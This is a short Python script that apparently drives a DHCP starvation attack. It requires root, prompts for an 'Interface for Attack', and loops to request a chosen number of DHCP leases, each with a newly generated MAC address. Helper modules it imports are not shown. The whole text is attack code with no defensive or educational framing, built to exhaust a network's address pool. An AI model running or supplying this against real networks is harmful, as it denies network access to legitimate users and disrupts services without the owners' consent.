import os
import sys
if not os.geteuid() == 0:
    sys.exit("\nOnly root can run this script\n")

from dhcp import getNewLease
from helper import generateMac

interfaceToUse = input("Select Interface for Attack: (will not be checked) ")
inputTimeout = int(input("Timeout for DHCP Offer in seconds: "))
inputNumberOfLease = int(input("Number of leases: "))

for i in range(inputNumberOfLease):
    getNewLease(generateMac(),interfaceToUse, inputTimeout)